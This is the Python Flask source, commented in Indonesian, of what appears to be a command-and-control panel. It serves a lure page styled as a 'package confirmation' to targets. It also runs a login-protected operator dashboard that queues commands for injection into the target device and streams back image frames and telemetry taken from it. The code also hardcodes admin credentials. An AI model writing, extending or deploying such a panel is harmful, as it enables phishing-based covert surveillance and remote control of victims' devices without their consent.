import os
import base64
from flask import Flask, render_template, request, jsonify, session, redirect, url_for

app = Flask(__name__)
app.secret_key = "GEAR99_LAB_EXCLUSIVE_SECRET_KEY_99"

# Kredensial Login Administrator Panel Operator
USERNAME_ADMIN = "admin"
PASSWORD_ADMIN = "medusa123"

# State data global untuk aliran data nirkabel target
latest_frame = None
latest_output = ""
device_details = "MENUNGGU KONEKSI NODE..."
telemetry_logs = ["[SYSTEM] Central proxy automation secure channel online."]
pending_commands = []

# --- 1. RUTE NAVIGASI HALAMAN (ROUTING) ---

@app.route('/')
def index():
    return render_template('landing.html')

@app.route('/konfirmasi-paket')
def target_page():
    return render_template('target.html')

@app.route('/operator/dashboard')
def operator_dashboard():
    if not session.get("logged_in"):
        return render_template('login.html')
    return render_template('operator.html')

@app.route('/login', methods=['POST'])
def login():
    if request.form.get("user") == USERNAME_ADMIN and request.form.get("pass") == PASSWORD_ADMIN:
        session["logged_in"] = True
        return redirect(url_for("operator_dashboard"))
    return "Otorisasi Gagal. <a href='/operator/dashboard'>Coba Lagi</a>"

@app.route('/logout')
def logout():
    session.pop("logged_in", None)
    return redirect(url_for("operator_dashboard"))

# --- 2. ENDPOINT API UNTUK INFRASTRUKTUR PANEL ---

@app.route('/api/execute-action', methods=['POST'])
def execute_action():
    global pending_commands, telemetry_logs
    data = request.json
    if data and 'action' in data:
        action = data['action']
        pending_commands.append(action)
        timestamp = new_timestamp = base64.b64encode(os.urandom(3)).decode('utf-8')[:5] # Dummy timestamp generator fallback
        telemetry_logs.append(f"[{action.upper()}] Perintah administratif berhasil disuntikkan ke antrean.")
    return jsonify({"status": "queued"})

@app.route('/api/get-telemetry-log')
def get_telemetry_log():
    global telemetry_logs, device_details
    return jsonify({
        "details": device_details,
        "logs": telemetry_logs
    })

@app.route('/api/get-latest-frame')
def get_latest_frame():
    global latest_frame
    if latest_frame:
        try:
            header, encoded = latest_frame.split(",", 1)
            image_data = base64.b64decode(encoded)
            return image_data, 200, {'Content-Type': 'image/jpeg'}
        except Exception:
            return "", 204
    return "", 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
